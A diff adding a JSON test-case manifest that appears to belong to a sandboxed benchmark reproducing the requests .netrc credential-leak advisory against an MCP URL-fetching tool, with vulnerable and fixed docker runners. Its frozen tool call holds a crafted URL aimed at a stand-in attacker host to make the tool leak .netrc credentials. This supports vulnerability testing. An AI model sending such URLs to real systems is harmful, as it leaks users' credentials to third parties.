@@ -1,0 +1,217 @@
+{
+  "agent_task": {
+    "text": "Call the frozen fetch_url_text Tool and report only its returned result."
+  },
+  "analysis_patch": {
+    "path": "assets/analysis.patch",
+    "sha256": "0582fe044c0c59c88e6f7db48aad3d70da9c365d27f66460adb427f97f8ec5d2"
+  },
+  "analysis_source": {
+    "fixed": {
+      "root": "assets/analysis_fixed",
+      "tree_sha256": "2d3913c1c26913d255130daf69912ba5eac8895446236ea20ef6ed52eb797f54"
+    },
+    "vulnerable": {
+      "root": "assets/analysis_vulnerable",
+      "tree_sha256": "426d23a32233089a876f3f4ee8d06727a436c756b29e4565e768479bf0f3fbf5"
+    }
+  },
+  "case_id": "GH-P5-046",
+  "environment": {
+    "cap_drop": [
+      "ALL"
+    ],
+    "image": "sha256:12ecc8515a2ab20fb9142db1d65ff35830e81e3dd3c85600a770449bfe3fdb69",
+    "image_id": "sha256:12ecc8515a2ab20fb9142db1d65ff35830e81e3dd3c85600a770449bfe3fdb69",
+    "network": "none",
+    "read_only": true,
+    "security_options": [
+      "no-new-privileges:true"
+    ],
+    "user": "1010:1010"
+  },
+  "external_boundary": {
+    "configuration_sha256": "6020d6e654fc4347ba7caf6ae311f4673eb786a9776e3f781e7262ac3af03201",
+    "kind": "container-local-controlled-boundary"
+  },
+  "frozen_input": {
+    "arguments": {
+      "url": "http://marker.example:@attacker.example:{BOUNDARY_PORT}/gh-p5-046-controlled"
+    }
+  },
+  "host_profile": {
+    "opaque_id": "vhp-9ece8f27a880842e",
+    "profile_sha256": "9ece8f27a880842ee82c171f9923fd0ae025a3eccd156dd9da6a85b9a1800ca0"
+  },
+  "public_vulnerability": {
+    "advisory_id": "GHSA-9hjg-9r4m-mvj7",
+    "advisory_semantics": {
+      "advisory_id": "GHSA-9hjg-9r4m-mvj7",
+      "claims": [
+        {
+          "claim_id": "netrc-credential-third-party-transmission",
+          "effect_kind": "RESOURCE_EFFECT",
+          "effect_role": "TERMINAL",
+          "exact_quote": "leak .netrc credentials to third parties",
+          "object_kind": "http-credential-transmission",
+          "operation": "send",
+          "runtime_oracle": {
+            "effect_event_operation": "send",
+            "kind": "http-credential-provenance/v1"
+          }
+        }
+      ],
+      "review_method": "human-reviewed-public-advisory/v1",
+      "schema_version": "public-advisory-effect-semantics/v1",
+      "source_excerpt": "Requests vulnerable to .netrc credentials leak via malicious URLs\nDue to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.",
+      "source_excerpt_sha256": "07872f4ddbe2d232c47ca3204be9cc177efa6e7d70f8c3656da18f3ef516fbee",
+      "source_url": "https://osv.dev/vulnerability/GHSA-9hjg-9r4m-mvj7"
+    },
+    "advisory_url": "https://osv.dev/vulnerability/GHSA-9hjg-9r4m-mvj7",
+    "component_name": "requests",
+    "component_origin": "DIRECT_RUNTIME_DEPENDENCY",
+    "component_purl": "pkg:pypi/requests",
+    "fixed_version": "2.32.4",
+    "patch_url": "https://github.com/requests/requests/compare/v2.32.3...v2.32.4",
+    "repository_url": "https://github.com/alexandru2882/url-text-fetcher-mcp",
+    "source_commit": "5bb2a032f2829620c70e255cc1db616f578a1f4d",
+    "vulnerable_version": "2.32.3"
+  },
+  "runner": {
+    "fixed": {
+      "command": [
+        "docker",
+        "run",
+        "--rm",
+        "--network",
+        "none",
+        "--read-only",
+        "--tmpfs",
+        "/tmp:rw,exec,nosuid,nodev",
+        "--cap-drop",
+        "ALL",
+        "--security-opt",
+        "no-new-privileges:true",
+        "--add-host",
+        "attacker.example:127.0.0.1",
+        "--entrypoint=",
+        "--env",
+        "RQ1_HOST_PROFILE_CONFIG=/opt/gt/rq1_host_profile.json",
+        "--env",
+        "SHARED_HOST_PROFILE=/opt/gt/rq1_host_profile.json",
+        "--env",
+        "RQ1_HOST_PROFILE_SOURCE_SHA256=ea03299160fde39fd2fd20ae9abd5e9897898e9fc994e62447aa867a8f11661f",
+        "-v",
+        "__VULVEIL_OUTPUT_DIR__:/workspace/output:rw",
+        "-v",
+        "__OSCAR_CASESET_ROOT__/profiles/GH-P5-046.json:/opt/gt/rq1_host_profile.json:ro",
+        "-v",
+        "__OSCAR_CASESET_ROOT__/runners/run_requests_netrc_resync.py:/opt/gt/run_requests_netrc_resync.py:ro",
+        "-v",
+        "__VULVEIL_CASE_DIR__/assets/host_core.py:/opt/gt/host_core.py:ro",
+        "-v",
+        "__VULVEIL_CASE_DIR__/assets/shared_host_runner_base.py:/opt/gt/shared_host_runner_base.py:ro",
+        "-v",
+        "__VULVEIL_CASE_DIR__/assets/shared_host_runner.py:/opt/gt/shared_host_runner.py:ro",
+        "-v",
+        "__VULVEIL_CASE_DIR__/assets/projection.py:/opt/gt/projection.py:ro",
+        "sha256:12ecc8515a2ab20fb9142db1d65ff35830e81e3dd3c85600a770449bfe3fdb69",
+        "python",
+        "/opt/gt/run_requests_netrc_resync.py",
+        "--case",
+        "GH-P5-046",
+        "--side",
+        "fixed",
+        "--repetition",
+        "__VULVEIL_REPETITION__",
+        "--output",
+        "/workspace/output"
+      ],
+      "cwd": "/workspace",
+      "environment": {
+        "LANG": "C.UTF-8",
+        "LC_ALL": "C.UTF-8",
+        "TZ": "UTC"
+      },
+      "evidence_output": "/output/evidence.jsonl"
+    },
+    "repetitions": 3,
+    "timeout_seconds": 120,
+    "vulnerable": {
+      "command": [
+        "docker",
+        "run",
+        "--rm",
+        "--network",
+        "none",
+        "--read-only",
+        "--tmpfs",
+        "/tmp:rw,exec,nosuid,nodev",
+        "--cap-drop",
+        "ALL",
+        "--security-opt",
+        "no-new-privileges:true",
+        "--add-host",
+        "attacker.example:127.0.0.1",
+        "--entrypoint=",
+        "--env",
+        "RQ1_HOST_PROFILE_CONFIG=/opt/gt/rq1_host_profile.json",
+        "--env",
+        "SHARED_HOST_PROFILE=/opt/gt/rq1_host_profile.json",
+        "--env",
+        "RQ1_HOST_PROFILE_SOURCE_SHA256=ea03299160fde39fd2fd20ae9abd5e9897898e9fc994e62447aa867a8f11661f",
+        "-v",
+        "__VULVEIL_OUTPUT_DIR__:/workspace/output:rw",
+        "-v",
+        "__OSCAR_CASESET_ROOT__/profiles/GH-P5-046.json:/opt/gt/rq1_host_profile.json:ro",
+        "-v",
+        "__OSCAR_CASESET_ROOT__/runners/run_requests_netrc_resync.py:/opt/gt/run_requests_netrc_resync.py:ro",
+        "-v",
+        "__VULVEIL_CASE_DIR__/assets/host_core.py:/opt/gt/host_core.py:ro",
+        "-v",
+        "__VULVEIL_CASE_DIR__/assets/shared_host_runner_base.py:/opt/gt/shared_host_runner_base.py:ro",
+        "-v",
+        "__VULVEIL_CASE_DIR__/assets/shared_host_runner.py:/opt/gt/shared_host_runner.py:ro",
+        "-v",
+        "__VULVEIL_CASE_DIR__/assets/projection.py:/opt/gt/projection.py:ro",
+        "sha256:12ecc8515a2ab20fb9142db1d65ff35830e81e3dd3c85600a770449bfe3fdb69",
+        "python",
+        "/opt/gt/run_requests_netrc_resync.py",
+        "--case",
+        "GH-P5-046",
+        "--side",
+        "vulnerable",
+        "--repetition",
+        "__VULVEIL_REPETITION__",
+        "--output",
+        "/workspace/output"
+      ],
+      "cwd": "/workspace",
+      "environment": {
+        "LANG": "C.UTF-8",
+        "LC_ALL": "C.UTF-8",
+        "TZ": "UTC"
+      },
+      "evidence_output": "/output/evidence.jsonl"
+    }
+  },
+  "schema_version": "vulveil-blind-case/v3",
+  "source": {
+    "fixed_root": "assets/source_fixed",
+    "fixed_tree_sha256": "b89a61b3b423c140b18336c32f56bee16ade8658e0d60c9aa4d014e8311b67eb",
+    "vulnerable_root": "assets/source_vulnerable",
+    "vulnerable_tree_sha256": "b89a61b3b423c140b18336c32f56bee16ade8658e0d60c9aa4d014e8311b67eb"
+  },
+  "tool": {
+    "name": "fetch_url_text",
+    "transport": "stdio"
+  },
+  "tool_sequence": [
+    {
+      "arguments": {
+        "url": "http://marker.example:@attacker.example:{BOUNDARY_PORT}/gh-p5-046-controlled"
+      },
+      "name": "fetch_url_text"
+    }
+  ]
+}
